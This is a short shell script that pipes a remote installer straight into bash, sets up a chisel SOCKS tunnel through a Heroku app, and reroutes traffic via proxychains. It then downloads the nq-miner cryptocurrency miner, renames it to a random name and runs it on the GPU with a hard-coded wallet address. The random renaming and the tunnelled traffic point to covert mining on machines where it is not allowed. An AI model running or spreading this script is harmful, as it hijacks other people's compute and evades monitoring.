pkill chisel
curl https://i.jpillora.com/chisel! | bash 
chisel client --keepalive 90m  https://$1.herokuapp.com 9050:socks &
apt install proxychains
sed -i 's/socks4/socks5/g'  /etc/proxychains.conf
sed -i 's/proxy_dns/#proxy_dns/g'  /etc/proxychains.conf
sudo proxychains curl ifconfig.me
wget https://github.com/tomkha/nq-miner/releases/download/0.99.6/nq-miner-linux-0.99.6.tar.gz && tar xvzf nq-miner-linux-0.99.6.tar.gz
name=$RANDOM
mv nq-miner $name && sudo proxychains ./$name -t cuda -a "NQ56 JVMC 03YP S4DY NU9C 4VER JER8 EJY1 JX9U" -p $2
